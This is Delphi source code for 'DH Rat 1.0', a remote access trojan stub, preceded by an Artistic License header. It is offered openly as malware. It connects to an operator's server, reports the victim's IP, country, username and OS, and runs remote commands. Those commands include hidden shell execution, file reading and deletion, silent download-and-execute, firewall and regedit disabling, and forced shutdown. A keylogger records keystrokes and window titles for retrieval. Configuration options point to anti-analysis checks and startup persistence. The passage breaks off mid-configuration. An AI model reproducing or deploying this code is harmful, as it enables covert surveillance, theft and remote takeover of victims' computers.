{

  This software is Copyright (c) 2015 by Doddy Hackman.

  This is free software, licensed under:

  The Artistic License 1.0

  The Artistic License

  Preamble

  The intent of this document is to state the conditions under which a Package
  may be copied, such that the Copyright Holder maintains some semblance of
  artistic control over the development of the package, while giving the users of
  the package the right to use and distribute the Package in a more-or-less
  customary fashion, plus the right to make reasonable modifications.

  Definitions:

  - "Package" refers to the collection of files distributed by the Copyright
  Holder, and derivatives of that collection of files created through
  textual modification.
  - "Standard Version" refers to such a Package if it has not been modified,
  or has been modified in accordance with the wishes of the Copyright
  Holder.
  - "Copyright Holder" is whoever is named in the copyright or copyrights for
  the package.
  - "You" is you, if you're thinking about copying or distributing this Package.
  - "Reasonable copying fee" is whatever you can justify on the basis of media
  cost, duplication charges, time of people involved, and so on. (You will
  not be required to justify it to the Copyright Holder, but only to the
  computing community at large as a market that must bear the fee.)
  - "Freely Available" means that no fee is charged for the item itself, though
  there may be fees involved in handling the item. It also means that
  recipients of the item may redistribute it under the same conditions they
  received it.

  1. You may make and give away verbatim copies of the source form of the
  Standard Version of this Package without restriction, provided that you
  duplicate all of the original copyright notices and associated disclaimers.

  2. You may apply bug fixes, portability fixes and other modifications derived
  from the Public Domain or from the Copyright Holder. A Package modified in such
  a way shall still be considered the Standard Version.

  3. You may otherwise modify your copy of this Package in any way, provided that
  you insert a prominent notice in each changed file stating how and when you
  changed that file, and provided that you do at least ONE of the following:

  a) place your modifications in the Public Domain or otherwise make them
  Freely Available, such as by posting said modifications to Usenet or an
  equivalent medium, or placing the modifications on a major archive site
  such as ftp.uu.net, or by allowing the Copyright Holder to include your
  modifications in the Standard Version of the Package.

  b) use the modified Package only within your corporation or organization.

  c) rename any non-standard executables so the names do not conflict with
  standard executables, which must also be provided, and provide a separate
  manual page for each non-standard executable that clearly documents how it
  differs from the Standard Version.

  d) make other distribution arrangements with the Copyright Holder.

  4. You may distribute the programs of this Package in object code or executable
  form, provided that you do at least ONE of the following:

  a) distribute a Standard Version of the executables and library files,
  together with instructions (in the manual page or equivalent) on where to
  get the Standard Version.

  b) accompany the distribution with the machine-readable source of the Package
  with your modifications.

  c) accompany any non-standard executables with their corresponding Standard
  Version executables, giving the non-standard executables non-standard
  names, and clearly documenting the differences in manual pages (or
  equivalent), together with instructions on where to get the Standard
  Version.

  d) make other distribution arrangements with the Copyright Holder.

  5. You may charge a reasonable copying fee for any distribution of this
  Package.  You may charge any fee you choose for support of this Package. You
  may not charge a fee for this Package itself. However, you may distribute this
  Package in aggregate with other (possibly commercial) programs as part of a
  larger (possibly commercial) software distribution provided that you do not
  advertise this Package as a product of your own.

  6. The scripts and library files supplied as input to or produced as output
  from the programs of this Package do not automatically fall under the copyright
  of this Package, but belong to whomever generated them, and may be sold
  commercially, and may be aggregated with this Package.

  7. C or perl subroutines supplied by you and linked into this Package shall not
  be considered part of this Package.

  8. The name of the Copyright Holder may not be used to endorse or promote
  products derived from this software without specific prior written permission.

  9. THIS PACKAGE IS PROVIDED "AS IS" AND WITHOUT ANY EXPRESS OR IMPLIED
  WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED WARRANTIES OF
  MERCHANTIBILITY AND FITNESS FOR A PARTICULAR PURPOSE.

  The End

}

// DH Rat 1.0
// (C) Doddy Hackman 2015

program stub;

{$APPTYPE GUI}
{$R *.res}
{$POINTERMATH ON}

uses
  System.SysUtils, System.Win.ScktComp, Winapi.Windows, WinInet, Classes,
  MMSystem, tlhelp32, ShellApi, ComObj, Registry, auxiliar_tools, Math,
  Winapi.Messages, WinSvc, URLMon, builder_tools;

var
  ip: string;
  port: string;

var
  Nombre2: string;

  //

var
  op_hide_file: string;
  op_startup: string;
  op_select_path: string;
  op_i_use_this: string;
  paths: string;
  path: string;
  folder: string;
  op_virtual_pc: string;
  op_virtual_box: string;
  op_debug: string;
  op_wireshark: string;
  op_ollydbg: string;
  op_anubis: string;
  op_kaspersky: string;
  op_vmware: string;
  op_uac: string;
  op_firewall: string;
  op_cmd: string;
  op_run: string;
  op_taskmgr: string;
  op_regedit: string;
  op_updates: string;

var
  dir: string;
  dir_hide: string;
  nombrereal: string;
  rutareal: string;
  yalisto: string;
  nombre_registro: string;
  keylogger_logs: string;
  //

var
  cliente: TClientSocket;
  metodo: TMethod;
  mensajes: TMsg;

var
  ventanas_activas: string;

  // Functions

function regex(text: String; deaca: String; hastaaca: String): String;
begin
  Delete(text, 1, AnsiPos(deaca, text) + length(deaca) - 1);
  SetLength(text, AnsiPos(hastaaca, text) - 1);
  Result := text;
end;

function toma(const pagina: string): UTF8String;

// Credits : Based on http://www.scalabium.com/faq/dct0080.htm
// Thanks to www.scalabium.com

var
  nave1: HINTERNET;
  nave2: HINTERNET;
  tou: DWORD;
  codez: UTF8String;
  codee: array [0 .. 1023] of byte;
  finalfinal: string;

begin

  try

    begin

      finalfinal := '';
      Result := '';

      nave1 := InternetOpen
        ('Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0',
        INTERNET_OPEN_TYPE_PRECONFIG, nil, nil, 0);

      nave2 := InternetOpenUrl(nave1, PChar(pagina), nil, 0,
        INTERNET_FLAG_RELOAD, 0);

      repeat

      begin
        InternetReadFile(nave2, @codee, SizeOf(codee), tou);
        SetString(codez, PAnsiChar(@codee[0]), tou);
        finalfinal := finalfinal + codez;
      end;

      until tou = 0;

      InternetCloseHandle(nave2);
      InternetCloseHandle(nave1);

      Result := finalfinal;
    end;

  except
    //
  end;
end;

// Other Functions

procedure savefile(filename, texto: string);
var
  ar: TextFile;

begin

  try

    begin
      AssignFile(ar, filename);
      FileMode := fmOpenWrite;

      if FileExists(filename) then
        Append(ar)
      else
        Rewrite(ar);

      Write(ar, texto);
      CloseFile(ar);
    end;
  except
    //
  end;

end;

function listardirectorio(dir: string): string;
var

  busqueda: TSearchRec;
  code: string;

begin

  code := '';

  FindFirst(dir + '\*.*', faAnyFile + faDirectory + faReadOnly, busqueda);

  code := code + '[+] : ' + busqueda.Name + sLineBreak;

  while FindNext(busqueda) = 0 do
  begin
    code := code + '[+] : ' + busqueda.Name + sLineBreak;
  end;

  Result := code;
  System.SysUtils.FindClose(busqueda);

end;

function borraresto(archivo: string): string;
var
  code: string;
begin

  code := '';

  if DirectoryExists(archivo) then
  begin
    if (RemoveDir(archivo)) then
    begin
      code := '[+] Directory removed';
    end
    else
    begin
      code := '[-] Unknown error';
    end;
  end
  else
  begin
    code := '[-] Directory not found';
  end;
  if FileExists(archivo) then
  begin
    if (DeleteFile(PChar(archivo))) then
    begin
      code := '[+] File removed';
    end
    else
    begin
      code := '[-] Unknown error';
    end;
  end
  else
  begin
    code := '[-] File not found';
  end;

  Result := code;

end;

function LeerArchivo(const archivo: TFileName): String;
var
  lista: TStringList;
begin

  if (FileExists(archivo)) then
  begin

    lista := TStringList.Create;
    lista.Loadfromfile(archivo);
    Result := lista.text;
    lista.Free;

  end;

end;

function lectora(opcion: string): string;
var
  code: string;
begin

  code := '';

  if (opcion = 'open') then
  begin
    mciSendString('Set cdaudio door open wait', nil, 0, 0);
    code := '[+] Open CD : OK';
  end
  else
  begin
    mciSendString('Set cdaudio door closed wait', nil, 0, 0);
    code := '[+] Close CD : OK';
  end;

  Result := code;

end;

function cambiar_barra(opcion: string): string;
var
  code: string;
begin
  code := '';

  if (opcion = 'hide') then
  begin
    ShowWindow(FindWindow('Shell_TrayWnd', nil), SW_HIDE);
    code := '[+] Hidden Taskbar : OK';
  end
  else
  begin
    ShowWindow(FindWindow('Shell_TrayWnd', nil), SW_SHOWNA);
    code := '[+] Show Taskbar : OK';
  end;

  Result := code;

end;

function cambiar_iconos(opcion: string): string;
var
  code: string;
  acatoy: THandle;
begin
  code := '';
  acatoy := FindWindow('ProgMan', nil);
  acatoy := GetWindow(acatoy, GW_CHILD);
  if (opcion = 'hide') then
  begin
    ShowWindow(acatoy, SW_HIDE);
    code := '[+] Hidden Icons : OK';
  end
  else
  begin
    ShowWindow(acatoy, SW_SHOW);
    code := '[+] Show Icons : OK';
  end;
  Result := code;
end;

function mensaje(titulo, texto: string): string;
var
  code: string;
begin
  code := '';
  MessageBox(0, PChar(texto), PChar(titulo), MB_ICONINFORMATION);
  code := '[+] Message Sent';
  Result := code;
end;

function hablar(text: string): string;
var
  Voice: Variant;
  code: string;
begin
  code := '';
  Voice := CreateOLEObject('SAPI.SpVoice');
  Voice.speak(text);
  code := '[+] Voice Speak : OK';
  Result := code;
end;

function SendKeys(texto: string): string;
// Thanks to Remy Lebeau for the help
var
  eventos: PInput;
  controlb, controla: integer;
  code: string;
begin

  code := '';
  code := '[+] SendKeys : OK';

  GetMem(eventos, SizeOf(TInput) * (length(texto) * 2));

  controla := 0;

  for controlb := 1 to length(texto) do
  begin

    eventos[controla].Itype := INPUT_KEYBOARD;
    eventos[controla].ki.wVk := 0;
    eventos[controla].ki.wScan := ord(texto[controlb]);
    eventos[controla].ki.dwFlags := KEYEVENTF_UNICODE;
    eventos[controla].ki.time := 0;
    eventos[controla].ki.dwExtraInfo := 0;

    Inc(controla);

    eventos[controla].Itype := INPUT_KEYBOARD;
    eventos[controla].ki.wVk := 0;
    eventos[controla].ki.wScan := ord(texto[controlb]);
    eventos[controla].ki.dwFlags := KEYEVENTF_UNICODE or KEYEVENTF_KEYUP;
    eventos[controla].ki.time := 0;
    eventos[controla].ki.dwExtraInfo := 0;

    Inc(controla);

  end;

  SendInput(controla, eventos[0], SizeOf(TInput));

  Result := code;

end;

function escribir_word(texto: string): string;
var
  code: string;
begin
  code := '';
  code := '[+] Word Joke : OK';
  ShellExecute(0, nil, PChar('winword.exe'), nil, nil, SW_SHOWNORMAL);
  Sleep(7000);
  SendKeys(texto);
  Result := code;

end;

function listarprocesos(): string;
var
  conector: THandle;
  timbre: LongBool;
  indicio: TProcessEntry32;
  code: string;

begin

  code := '';

  conector := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  indicio.dwSize := SizeOf(indicio);

  timbre := Process32First(conector, indicio);

  while timbre do

  begin

    code := code + '[+] Name : ' + indicio.szExeFile + ' [+] PID : ' +
      IntToStr(indicio.th32ProcessID) + sLineBreak;

    timbre := Process32Next(conector, indicio);

  end;

  Result := code;

end;

function ejecutar(cmd: string): string;
// Credits : Function ejecutar() based in : http://www.delphidabbler.com/tips/61
// Thanks to www.delphidabbler.com

var
  parte1: TSecurityAttributes;
  parte2: TStartupInfo;
  parte3: TProcessInformation;
  parte4: THandle;
  parte5: THandle;
  control2: Boolean;
  contez: array [0 .. 255] of AnsiChar;
  notengoidea: Cardinal;
  fix: Boolean;
  code: string;

begin

  code := '';

  with parte1 do
  begin
    nLength := SizeOf(parte1);
    bInheritHandle := True;
    lpSecurityDescriptor := nil;
  end;

  CreatePipe(parte4, parte5, @parte1, 0);

  with parte2 do
  begin
    FillChar(parte2, SizeOf(parte2), 0);
    cb := SizeOf(parte2);
    dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
    wShowWindow := SW_HIDE;
    hStdInput := GetStdHandle(STD_INPUT_HANDLE);
    hStdOutput := parte5;
    hStdError := parte5;
  end;

  fix := CreateProcess(nil, PChar('cmd.exe /C ' + cmd), nil, nil, True, 0, nil,
    PChar('c:/'), parte2, parte3);

  CloseHandle(parte5);

  if fix then

    repeat

    begin
      control2 := ReadFile(parte4, contez, 255, notengoidea, nil);
    end;

    if notengoidea > 0 then
    begin
      contez[notengoidea] := #0;
      code := code + contez;
    end;

    until not(control2) or (notengoidea = 0);

  Result := code;

end;

function crazy_mouse(number: string): string;
var
  i: integer;
  code: string;
begin
  code := '';
  For i := 1 to StrToInt(number) do
  begin
    Sleep(1000);
    SetCursorPos(i, i);
  end;
  code := '[+] Crazy Mouse : OK';
  Result := code;
end;

function get_os(): string;
var
  os: string;
begin
  if (Win32MajorVersion = 5) and (Win32MinorVersion = 1) then
  begin
    os := 'Windows XP';
  end
  else if (Win32MajorVersion = 6) and (Win32MinorVersion = 0) then
  begin
    os := 'Windows Vista';
  end
  else if (Win32MajorVersion = 6) and (Win32MinorVersion = 1) then
  begin
    os := 'Windows 7';
  end
  else if (Win32MajorVersion = 6) and (Win32MinorVersion = 2) then
  begin
    os := 'Windows 8';
  end
  else
  begin
    os := 'Unknown';
  end;
  Result := os;
end;

function datanow(): string;
var
  code: string;
  ip: string;
  pais: string;
  re: string;
  username: string;
  os: string;

begin

  try
    begin

      code := toma('http://whatismyipaddress.com/');

      ip := regex(code, 'alt="Click for more about ', '"></a>');
      pais := regex(code, 'Country:</th><td style="font-size:14px;">',
        '</td></tr>');

      if (ip = '') then
      begin
        ip := '?';
      end;

      if (pais = '') then
      begin
        pais := '?';
      end;

      username := GetEnvironmentVariable('username');
      os := get_os();

      re := '[datos_nuevos][ip]' + ip + '[ip]' + '[pais]' + pais + '[pais]' +
        '[username]' + username + '[username]' + '[os]' + os + '[os]';
    end;
  except
    //
  end;

  Result := re;

end;


// More Functions

function kill_process(proceso: string): string;
// Based on : http://www.swissdelphicenter.ch/torry/showcode.php?id=266
// Thanks to Misha Moellner
var
  seguir: bool;
  var1: THandle;
  var2: TProcessEntry32;
begin
  var1 := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  var2.dwSize := SizeOf(var2);
  seguir := Process32First(var1, var2);
  while integer(seguir) <> 0 do
  begin
    if (ExtractFileName(var2.szExeFile) = proceso) then
      if (TerminateProcess(OpenProcess($0001, bool(0), var2.th32ProcessID), 0))
      then
      begin
        Result := '[+] Process Killed';
      end
      else
      begin
        Result := '[-] Process not killed';
      end;
    seguir := Process32Next(var1, var2);
  end;
  CloseHandle(var1);
end;

function regedit(opcion: string): string;
var
  make: TRegistry;
begin
  make := TRegistry.Create;
  make.RootKey := HKEY_CURRENT_USER;
  make.OpenKey
    ('Software\Microsoft\Windows\CurrentVersion\Policies\System', True);
  if (opcion = 'show') then
  begin
    make.WriteInteger('DisableRegistryTools', 0);
  end;
  if (opcion = 'hide') then
  begin
    make.WriteInteger('DisableRegistryTools', 1);
  end;
  make.Free;
  Result := '[+] Regedit Changed : OK';
end;

function desactivar_firewall(os, opcion: string): string;
begin
  if (os = 'xp') then
  begin
    if (opcion = 'off') then
    begin
      ejecutar('netsh firewall set opmode enable');
    end;
    if (opcion = 'on') then
    begin
      ejecutar('netsh firewall set opmode disable');
    end;
  end;
  if (os = 'seven') then
  begin
    if (opcion = 'off') then
    begin
      ejecutar('netsh advfirewall set currentprofile state on');
    end;
    if (opcion = 'on') then
    begin
      ejecutar('netsh advfirewall set currentprofile state off');
    end;
  end;
  Result := '[+] Firewall Changed : OK';
end;

function cambiar_hora(cantidad: string): string;
var
  tiempo: TSystemTime;
  i: integer;
  nueva_hora: TDateTime;
  hora: integer;
  minutos: integer;
begin
  For i := 1 to StrToInt(cantidad) do
  begin
    hora := RandomRange(1, 23);
    minutos := RandomRange(1, 40);
    nueva_hora := StrToTime(IntToStr(hora) + ':' + IntToStr(minutos) + ':00');
    DateTimeToSystemTime(Date + nueva_hora, tiempo);
    SetLocalTime(tiempo);
    Sleep(1000);
  end;
  Result := '[+] Crazy Hour : OK';
end;

function apagar_monitor(): string;
const
  MONITOR_ON = -1;
  MONITOR_OFF = 2;
  MONITOR_STANDBY = 1;
begin
  SendMessage(GetForegroundWindow(), WM_SYSCOMMAND, SC_MONITORPOWER,
    MONITOR_OFF);
  Result := '[+] Turn Off Monitor : OK';
end;

function apagar(): string;
begin
  ejecutar('shutdown -p');
  Result := '[+] Shutdown : OK';
end;

function cerrar_sesion(): string;
begin
  ejecutar('shutdown -l');
  Result := '[+] Close Session : OK';
end;

function reiniciar(): string;
begin
  ejecutar('shutdown -r');
  Result := '[+] Reboot : OK';
end;

function cargar_pagina(pagina: string): string;
begin
  ejecutar('start ' + pagina);
  Result := '[+] Load Page : OK';
end;

function cargar_paint(): string;
begin
  ejecutar('mspaint.exe');
  Result := '[+] Paint Loaded : OK';
end;

function edit_text_taskbar(opcion, texto: string): string;
var
  make: TRegistry;
begin
  make := TRegistry.Create;
  make.RootKey := HKEY_CURRENT_USER;
  make.OpenKey('Control Panel\International', True);
  if (opcion = 'enable') then
  begin
    make.WriteString('sShortTime', 'tt');
    make.WriteString('sTimeFormat', 'tt');
    make.WriteString('s1159', texto);
    make.WriteString('s2359', texto);
  end;
  if (opcion = 'disable') then
  begin
    make.WriteString('sShortTime', 'H:mm');
    make.WriteString('sTimeFormat', 'H:mm:ss');
    make.WriteString('s1159', '');
    make.WriteString('s2359', '');
  end;
  make.Free;
  Result := '[+] Edit Taskbar Text : OK';
end;

function play_beep(cantidad: string): string;
var
  i: integer;
begin
  For i := 1 to StrToInt(cantidad) do
  begin
    Winapi.Windows.Beep(800, 100);
  end;

  Result := '[+] Beep : OK';
end;

function check_drive(target: string): Boolean;
var
  a, b, c: Cardinal;
begin
  Result := GetVolumeInformation(PChar(target), nil, 0, @c, a, b, nil, 0);
end;

function get_drives(): string;
var
  unidad: Char;
  code: string;
begin
  code := code + '[+] List Drives : OK' + sLineBreak;
  for unidad := 'C' to 'Z' do
  begin
    if (check_drive(PChar(unidad + ':\')) = True) then
    begin
      if (GetDriveType(PChar(unidad + ':\')) = DRIVE_REMOVABLE) then
      begin
        code := code + '[+] USB Drive : ' + unidad + sLineBreak;
      end;
      if (GetDriveType(PChar(unidad + ':\')) = DRIVE_FIXED) then
      begin
        code := code + '[+] Fixed Drive : ' + unidad + sLineBreak;
      end;
      if (GetDriveType(PChar(unidad + ':\')) = DRIVE_REMOTE) then
      begin
        code := code + '[+] Remote Drive : ' + unidad + sLineBreak;
      end;
      if (GetDriveType(PChar(unidad + ':\')) = DRIVE_CDROM) then
      begin
        code := code + '[+] CD Rom Drive : ' + unidad + sLineBreak;
      end;
      if (GetDriveType(PChar(unidad + ':\')) = DRIVE_RAMDISK) then
      begin
        code := code + '[+] RAM Drive : ' + unidad + sLineBreak;
      end;
    end;
  end;
  Result := code;
end;

function get_services(): string;

// Based on : http://www.delphitricks.com/source-code/systeminfo/get_a_list_of_installed_services.html
// Thanks to Alexander Savchev

type
  typeuno = array [0 .. 4096] of TEnumServiceStatus;
  typedos = ^typeuno;

var
  i: integer;

  uno: SC_Handle;
  dos, tres, cuatro: DWORD;
  cinco: typedos;
  code: string;

begin

  code := '[+] List services : OK' + sLineBreak;

  uno := OpenSCManager(PChar(''), nil, SC_MANAGER_ALL_ACCESS);

  if (uno > 0) then
  begin

    cuatro := 0;

    New(cinco);

    EnumServicesStatus(uno, SERVICE_WIN32, SERVICE_STATE_ALL, cinco^[0],
      SizeOf(cinco^), dos, tres, cuatro);

    code := code + '[+] Services Found : ' + IntToStr(tres) + sLineBreak;

    for i := 0 to tres - 1 do
    begin
      code := code + '[+] Service : ' + StrPas(cinco^[i].lpDisplayName) +
        sLineBreak;
    end;

    Result := code;

    Dispose(cinco);

    CloseServiceHandle(uno);
  end;
end;

function get_windows(var1: HWND; var2: integer): Boolean; stdcall;
var
  uno: DWORD;
  titulo, dos: string;
begin

  GetWindowThreadProcessId(var1, uno);

  SetLength(titulo, 255);
  SetLength(titulo, GetWindowText(var1, PChar(titulo), length(titulo)));
  if not(titulo = '') then
  begin
    ventanas_activas := ventanas_activas + titulo + sLineBreak;
  end;
  Result := True;

end;

procedure cargar_archivo(archivo: TFileName; tipo: string);
var
  Data: SHELLEXECUTEINFO;
begin
  if (FileExists(archivo)) then
  begin
    ZeroMemory(@Data, SizeOf(SHELLEXECUTEINFO));
    Data.cbSize := SizeOf(SHELLEXECUTEINFO);
    Data.fMask := SEE_MASK_NOCLOSEPROCESS;
    Data.Wnd := 0;
    Data.lpVerb := 'open';
    Data.lpFile := PChar(archivo);
    if (tipo = 'Show') then
    begin
      Data.nShow := SW_SHOWNORMAL;
    end;
    if (tipo = 'Hide') then
    begin
      Data.nShow := SW_HIDE;
    end;
    if not ShellExecuteEx(@Data) then
      if GetLastError <= 32 then
      begin
        SysErrorMessage(GetLastError);
      end;
  end;
end;

function download_and_execute(link, new_name: string): string;
begin
  UrlDownloadToFile(nil, PChar(link), PChar(new_name), 0, nil);
  if (FileExists(new_name)) then
  begin
    SetFileAttributes(PChar(new_name), FILE_ATTRIBUTE_HIDDEN);
    cargar_archivo(PChar(new_name), 'Hide');
  end;
  Result := '[+] Download & Execute : OK';
end;

function uninstaller(): string;
begin
  try
    begin
      delete_startup(nombre_registro);
      Result := '[+] Uninstalled';
    end;
  except
    begin
      Result := '[-] Error';
    end;
  end;
end;

//

procedure on_connected(Self: Pointer; Sender: TObject;
  Socket: TCustomWinSocket);
begin
  Socket.SendText(datanow());
end;

procedure on_bye(Self: Pointer; Sender: TObject; Socket: TCustomWinSocket);
begin
  PostQuitMessage(0);
end;

procedure on_read(Self: Pointer; Sender: TObject; Socket: TCustomWinSocket);
var
  code: string;
  argumento1: string;
  argumento2: string;
begin
  code := Socket.ReceiveText;
  // Writeln(code);

  argumento1 := regex(code, '[argumento1]', '[argumento1]');
  argumento2 := regex(code, '[argumento2]', '[argumento2]');

  if (Pos('![opencd]', code) > 0) then
  begin
    cliente.Socket.SendText(lectora('open'));
  end;

  if (Pos('![closecd]', code) > 0) then
  begin
    cliente.Socket.SendText(lectora('close'));
  end;

  if (Pos('![listardirectorio]', code) > 0) then
  begin
    cliente.Socket.SendText(listardirectorio(argumento1));
  end;

  if (Pos('![borraresto]', code) > 0) then
  begin
    cliente.Socket.SendText(borraresto(argumento1));
  end;

  if (Pos('![leerarchivo]', code) > 0) then
  begin
    cliente.Socket.SendText(LeerArchivo(argumento1));
  end;

  if (Pos('![keyloggerlogs]', code) > 0) then
  begin
    cliente.Socket.SendText('![keyloggerlogs]<br>' +
      LeerArchivo(keylogger_logs));
  end;

  if (Pos('![sendkeys]', code) > 0) then
  begin
    cliente.Socket.SendText(SendKeys(argumento1));
  end;

  if (Pos('![escribirword]', code) > 0) then
  begin
    cliente.Socket.SendText(escribir_word(argumento1));
  end;

  if (Pos('![mensaje]', code) > 0) then
  begin
    cliente.Socket.SendText(mensaje(argumento1, argumento2));
  end;

  if (Pos('![hablar]', code) > 0) then
  begin
    cliente.Socket.SendText(hablar(argumento1));
  end;

  if (Pos('![matarproceso]', code) > 0) then
  begin
    cliente.Socket.SendText(kill_process(argumento1));
  end;

  if (Pos('![ejecutar]', code) > 0) then
  begin
    cliente.Socket.SendText(ejecutar(argumento1));
  end;

  if (Pos('![crazymouse]', code) > 0) then
  begin
    cliente.Socket.SendText(crazy_mouse(argumento1));
  end;

  if (Pos('![ocultartaskbar]', code) > 0) then
  begin
    cliente.Socket.SendText(cambiar_barra('hide'));
  end;

  if (Pos('![volvertaskbar]', code) > 0) then
  begin
    cliente.Socket.SendText(cambiar_barra('na'));
  end;

  if (Pos('![ocultariconos]', code) > 0) then
  begin
    cliente.Socket.SendText(cambiar_iconos('hide'));
  end;

  if (Pos('![volvericonos]', code) > 0) then
  begin
    cliente.Socket.SendText(cambiar_iconos('na'));
  end;

  if (Pos('![listarprocesos]', code) > 0) then
  begin
    cliente.Socket.SendText(listarprocesos());
  end;

  if (Pos('![regedit_on]', code) > 0) then
  begin
    cliente.Socket.SendText(regedit('show'));
  end;

  if (Pos('![regedit_off]', code) > 0) then
  begin
    cliente.Socket.SendText(regedit('hide'));
  end;

  if (Pos('![firewall_on]', code) > 0) then
  begin
    cliente.Socket.SendText(desactivar_firewall('seven', 'off'));
  end;

  if (Pos('![firewall_off]', code) > 0) then
  begin
    cliente.Socket.SendText(desactivar_firewall('seven', 'on'));
  end;

  if (Pos('![crazy_hour]', code) > 0) then
  begin
    cliente.Socket.SendText(cambiar_hora(argumento1));
  end;

  if (Pos('![apagar_monitor]', code) > 0) then
  begin
    cliente.Socket.SendText(apagar_monitor());
  end;

  if (Pos('![apagar]', code) > 0) then
  begin
    cliente.Socket.SendText(apagar());
  end;

  if (Pos('![reiniciar]', code) > 0) then
  begin
    cliente.Socket.SendText(reiniciar());
  end;

  if (Pos('![cerrar_sesion]', code) > 0) then
  begin
    cliente.Socket.SendText(cerrar_sesion());
  end;

  if (Pos('![abrir_url]', code) > 0) then
  begin
    cliente.Socket.SendText(cargar_pagina(argumento1));
  end;

  if (Pos('![abrir_paint]', code) > 0) then
  begin
    cliente.Socket.SendText(cargar_paint());
  end;

  if (Pos('![edit_text_taskbar_on]', code) > 0) then
  begin
    cliente.Socket.SendText(edit_text_taskbar('enable', argumento1));
  end;

  if (Pos('![edit_text_taskbar_off]', code) > 0) then
  begin
    cliente.Socket.SendText(edit_text_taskbar('disable', ''));
  end;

  if (Pos('![play_beep]', code) > 0) then
  begin
    cliente.Socket.SendText(play_beep(argumento1));
  end;

  if (Pos('![get_drives]', code) > 0) then
  begin
    cliente.Socket.SendText(get_drives());
  end;

  if (Pos('![get_services]', code) > 0) then
  begin
    cliente.Socket.SendText(get_services());
  end;

  if (Pos('![get_windows]', code) > 0) then
  begin
    EnumWindows(@get_windows, 9999);
    cliente.Socket.SendText(ventanas_activas);
  end;

  if (Pos('![download_and_execute]', code) > 0) then
  begin
    cliente.Socket.SendText(download_and_execute(argumento1, argumento2));
  end;

  if (Pos('![uninstaller]', code) > 0) then
  begin
    cliente.Socket.SendText(uninstaller());
  end;

end;

procedure conexion_now;
begin
  cliente := TClientSocket.Create(nil);
  try
    cliente.Address := ip;
    cliente.port := StrToInt(port);

    metodo.code := @on_connected;
    metodo.Data := cliente;
    cliente.OnConnect := TSocketNotifyEvent(metodo);

    metodo.code := @on_bye;
    metodo.Data := cliente;
    cliente.OnDisconnect := TSocketNotifyEvent(metodo);

    metodo.code := @on_read;
    metodo.Data := cliente;
    cliente.OnRead := TSocketNotifyEvent(metodo);

    cliente.Open;

    while GetMessage(mensajes, 0, 0, 0) do
    begin
      TranslateMessage(mensajes);
      DispatchMessage(mensajes);
    end;
  finally
    cliente.Free;
  end;
end;

procedure keylogger_teclas;
var
  i: integer;
  Result: Longint;
  mayus: integer;
  shift: integer;

const

  n_numeros_izquierda: array [1 .. 10] of string = ('48', '49', '50', '51',
    '52', '53', '54', '55', '56', '57');

const
  t_numeros_izquierda: array [1 .. 10] of string = ('0', '1', '2', '3', '4',
    '5', '6', '7', '8', '9');

const
  n_numeros_derecha: array [1 .. 10] of string = ('96', '97', '98', '99', '100',
    '101', '102', '103', '104', '105');

const
  t_numeros_derecha: array [1 .. 10] of string = ('0', '1', '2', '3', '4', '5',
    '6', '7', '8', '9');

const
  n_shift: array [1 .. 22] of string = ('48', '49', '50', '51', '52', '53',
    '54', '55', '56', '57', '187', '188', '189', '190', '191', '192', '193',
    '291', '220', '221', '222', '226');

const
  t_shift: array [1 .. 22] of string = (')', '!', '@', '#', '\$', '%', '¨', '&',
    '*', '(', '+', '<', '_', '>', ':', '\', ' ? ', ' / \ ', '}', '{', '^', '|');

const
  n_raros: array [1 .. 17] of string = ('1', '8', '13', '32', '46', '187',
    '188', '189', '190', '191', '192', '193', '219', '220', '221',
    '222', '226');

const
  t_raros: array [1 .. 17] of string = ('[mouse click]', '[backspace]',
    '<br>[enter]<br>', '[space]', '[suprimir]', '=', ',', '-', '.', ';', '\',
    ' / ', ' \ \ \ ', ']', '[', '~', '\/');

begin
  while '1' = '1' do
  begin
    Sleep(100);
    // Others

    for i := Low(n_raros) to High(n_raros) do
    begin
      Result := GetAsyncKeyState(StrToInt(n_raros[i]));
      If Result = -32767 then
      begin
        savefile('logs.html', t_raros[i]);
      end;
    end;

    // Numbers

    for i := Low(n_numeros_derecha) to High(n_numeros_derecha) do
    begin
      Result := GetAsyncKeyState(StrToInt(n_numeros_derecha[i]));
      If Result = -32767 then
      begin
        savefile('logs.html', t_numeros_derecha[i]);
      end;
    end;

    for i := Low(n_numeros_izquierda) to High(n_numeros_izquierda) do
    begin
      Result := GetAsyncKeyState(StrToInt(n_numeros_izquierda[i]));
      If Result = -32767 then
      begin
        savefile('logs.html', t_numeros_izquierda[i]);
      end;
    end;

    // SHIFT

    if (GetAsyncKeyState(VK_SHIFT) <> 0) then
    begin

      for i := Low(n_shift) to High(n_shift) do
      begin
        Result := GetAsyncKeyState(StrToInt(n_shift[i]));
        If Result = -32767 then
        begin
          savefile('logs.html', t_shift[i]);
        end;
      end;

      for i := 65 to 90 do
      begin
        Result := GetAsyncKeyState(i);
        If Result = -32767 then
        Begin
          savefile('logs.html', Chr(i + 0));
        End;
      end;

    end;

    // MAYUS

    if (GetKeyState(20) = 0) then
    begin
      mayus := 32;
    end
    else
    begin
      mayus := 0;
    end;

    for i := 65 to 90 do
    begin
      Result := GetAsyncKeyState(i);
      If Result = -32767 then
      Begin
        savefile('logs.html', Chr(i + mayus));
      End;
    end;
  end;
end;

procedure keylogger_ventanas;
var
  ventana1: array [0 .. 255] of Char;
  nombre1: string;
begin
  while '1' = '1' do
  begin
    Sleep(100);
    GetWindowText(GetForegroundWindow, ventana1, SizeOf(ventana1));

    nombre1 := ventana1;

    if not(nombre1 = Nombre2) then
    begin
      Nombre2 := nombre1;
      savefile('logs.html', '<hr style=color:#00FF00><h2><center>' + Nombre2 +
        '</h2></center><br>');
    end;
  end;
end;

var
  contenido: string;

begin

  try
    nombre_registro := 'uber_now';
    contenido := leer_recurso(666);
    if not(contenido = '') then
    begin

      ip := regex(contenido, '[ip]', '[ip]');
      port := regex(contenido, '[port]', '[port]');

      op_hide_file := regex(contenido, '[hide_file]', '[hide_file]');
      op_startup := regex(contenido, '[startup]', '[startup]');
      op_select_path := regex(contenido, '[op_select_path]',
        '[op_select_path]');
      op_i_use_this := regex(contenido, '[op_i_use_this]', '[op_i_use_this]');
      paths := regex(contenido, '[paths]', '[paths]');
      path := regex(contenido, '[path]', '[path]');
      folder := regex(contenido, '[folder]', '[folder]');

